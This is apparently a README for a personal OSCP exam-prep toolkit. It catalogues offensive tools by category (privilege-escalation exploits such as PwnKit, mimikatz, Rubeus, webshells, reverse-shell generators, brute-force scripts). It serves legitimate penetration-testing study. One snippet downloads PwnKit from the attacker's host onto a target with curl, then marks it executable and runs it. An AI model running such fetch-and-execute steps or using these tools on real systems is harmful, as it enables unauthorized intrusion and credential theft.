# oscp-toolkit

> Cached scripts, binaries, and templates for OSCP exam day. Companion to [The Path](https://github.com/Jimi421/patha).

A single-command installer that builds a predictable `~/oscp-tools/` tree on a fresh Kali VM. Every tool referenced in The Path's nodes lives here, with a known location and a documented source.

## Why this exists

Exam day is the wrong time to discover that you forgot to clone PwnKit, the `winPEASx64.exe` URL has changed, or your zodiac.sh from a recycled lab box no longer exists. This repo solves that:

- **Reproducible** — same `~/oscp-tools/` tree every time you spin up a Kali VM.
- **Idempotent** — re-running `setup.sh` is safe; it only fetches what's missing.
- **Categorized** — `recon/`, `privesc-linux/`, `privesc-windows/`, `ad/`, `pivoting/`, `web/`, `custom/`. You always know where things are.
- **Documented** — every tool below has a source URL, a one-line description, and the Path node that references it.

## Quick start

```bash
git clone https://github.com/Jimi421/oscp-toolkit.git
cd oscp-toolkit
./setup.sh
```

By default everything lands in `~/oscp-tools/`. Override with:

```bash
OSCP_TOOLS_DIR=/opt/tools ./setup.sh
```

Flags:

- `--core` — install only the core exam-day set (skips PayloadsAllTheThings, nishang, etc.)
- `--force` — re-clone/re-download even if files exist (useful after a few months to refresh)

## The tree

```
~/oscp-tools/
├── recon/                  Discovery and enumeration
├── privesc-linux/          Linux local privilege escalation
├── privesc-windows/        Windows local privilege escalation
├── ad/                     Active Directory attack tooling
├── pivoting/               Tunneling and lateral movement
├── web/                    Webshells, payloads, RCE templates
├── shells/                 Reverse shell generators (offline mirror)
├── recon-extras/           Wordlists (SecLists mirror)
├── custom/                 My own scripts (zodiac.sh, colors.sh, etc.)
└── setup.log               Output of last setup.sh run
```

## Core tools

The set installed without `--core` flag, organized by category. Each entry: **name** — what it does — *(Path node that uses it)*.

### recon/

- **linpeas** — Linux privilege escalation auditor; the standard. Reads SUID, sudoers, cron, kernel CVEs, capabilities. — *([linpeas](https://github.com/Jimi421/patha) node)*
- **kerbrute_linux_amd64** — Kerberos username enumeration and password spraying via AS-REQ. Faster and quieter than SMB-based spraying. — *(ad_spray, kerberoast)*
- **nmap-vulners.nse** — NSE script for matching service versions against vulners CVE DB. Drop into `/usr/share/nmap/scripts/`. — *(targeted_scan)*

### privesc-linux/

- **PwnKit** — CVE-2021-4034 polkit exploit. Works on most Ubuntu/Debian pre-2022. The fastest root on a lab box. — *(pwnkit, sona_lessons, exghost_lessons)*
- **linux-exploit-suggester** — Kernel version → matching public exploits. — *(kernel_exploit)*
- **linux-smart-enumeration** — More targeted than linpeas, less noisy. Useful when linpeas output is overwhelming. — *(linux_enum_quick)*
- **pspy64 / pspy32** — Process snooper. Watches cron/scheduled tasks without root. Essential for finding writable scripts run as root. — *(cron_check, linux_post_exploit)*

### privesc-windows/

- **PowerUp** (from PowerSploit) — PowerShell-based Windows privesc auditor. Service permissions, unquoted paths, AlwaysInstallElevated. — *(powerup, win_dll_hijack)*
- **PrintSpoofer64.exe / PrintSpoofer32.exe** — SeImpersonatePrivilege → SYSTEM. The reliable Potato variant. — *(token_privs)*
- **GodPotato-NET4.exe** — Modern Potato. Works on Server 2019/2022 where older Potatoes fail. — *(token_privs)*
- **winPEASx64.exe / winPEASany.exe / winPEAS.bat** — Windows equivalent of linpeas. `.bat` for old systems without PowerShell. — *(winpeas, windows_enum_quick)*

### ad/

- **Rubeus.exe** — Kerberos abuse toolkit. AS-REP roasting, kerberoasting, golden/silver tickets, ticket manipulation. — *(asrep_roast, kerberoast, silver_tickets)*
- **SharpHound.exe** — BloodHound ingestor for Windows. Run from a domain-joined or relayed context. — *(bloodhound)*
- **mimikatz.exe** — Credential extraction toolkit. LSASS dumps, ticket forging, DCSync. — *(mimikatz, mimikatz_advanced)*
- **impacket-examples** — psexec.py, secretsdump.py, GetUserSPNs.py, GetNPUsers.py, ticketer.py, the entire suite. — *(ad_spray, dcsync, kerberoast, silver_tickets)*
- **BloodHound.py** — Python BloodHound ingestor. Run from Kali without needing a Windows foothold. — *(bloodhound)*
- **PetitPotam** — Coerce DC into authenticating to attacker host. Pair with ntlmrelayx. — *(ntlm_relay)*
- **PKINITtools** — Certificate-based AD authentication (ADCS attacks). gettgtpkinit.py for cert-to-TGT. — *(adcs)*

### pivoting/

- **chisel** (linux + windows binaries) — TCP/UDP tunnel over HTTP. Single binary, runs anywhere. Most-used pivot tool. — *(chisel, pivot_start)*
- **ligolo-ng** (proxy + agents) — Modern tunneling, creates a TUN interface so the pivot is transparent. — *(ligolo)*
- **sshuttle** — Transparent SSH-based VPN-ish tunnel. Cleanest option when SSH is available. — *(sshuttle)*

## Extended tools

Installed by default; skip with `--core`:

### web/

- **webshells** (tennc/webshell) — Comprehensive collection of webshells across languages.
- **PayloadsAllTheThings** — The reference for web injection payloads, RCE patterns, file upload bypasses.
- **php-reverse-shell.php** — pentestmonkey's classic. Edit IP/port, upload, trigger.
- **nishang** — PowerShell offensive framework. Many useful one-off scripts.

### shells/

- **revshells-offline** (0dayCTF/reverse-shell-generator) — Offline mirror of revshells.com. Generates encoded reverse shells in every common language. Don't rely on internet on exam day.

### recon-extras/

- **SecLists** — Wordlists, usernames, default credentials. Big — clones the full repo (~1GB).

## Custom scripts (`custom/`)

These are scripts I've built that don't have a public home but are too useful to lose. Source: `tools/` directory in this repo.

- **zodiac.sh** — Expect-based brute force for menu-driven TCP services (NEXUS BACKUP MANAGER pattern from Sona). Asks ANSONE then brute-forces from wordlist. — *(bruteforce_custom_tcp, sona_lessons)*
- **colors.sh** — Same as zodiac.sh but for the ANSTWO color question. — *(bruteforce_custom_tcp, sona_lessons)*
- **brute-tcp-template.sh** — Generic expect skeleton for menu-driven TCP brute force. Comment-heavy; fill in service-specific regex and command. — *(bruteforce_custom_tcp)*
- **exploit-template.py** — Python PoC skeleton with Burp proxy support baked in. Start here when modifying any HTTP exploit. — *(exploit_fix_web, burp_comparer)*

## Suggested shell setup

Add to `~/.zshrc` (or `~/.bashrc`):

```bash
export OSCP_TOOLS="$HOME/oscp-tools"
alias serve='cd $OSCP_TOOLS && python3 -m http.server 8000'
alias toolkit='cd $OSCP_TOOLS'
```

Then on a target:

```bash
# On Kali:
serve

# On target:
curl http://$lhost:8000/privesc-linux/PwnKit -o /tmp/pwnkit
chmod +x /tmp/pwnkit && /tmp/pwnkit
```

## Maintenance

This repo updates as I find more useful tools or hit gaps mid-engagement. Run `./setup.sh --force` every couple months to pull latest versions.

If a release URL has changed (the version number is hardcoded in `setup.sh` for chisel and ligolo), grep for it and update — the script will report failures explicitly so you'll know what to fix.

## Companion project

This toolkit is meant to be used alongside [**The Path**](https://github.com/Jimi421/patha) — an interactive decision-tree methodology for OSCP exam day. The Path tells you *what to do*; this toolkit makes sure you *have what you need to do it*.

---

*Not affiliated with OffSec. Built for personal exam prep; shared because someone else might find it useful.*
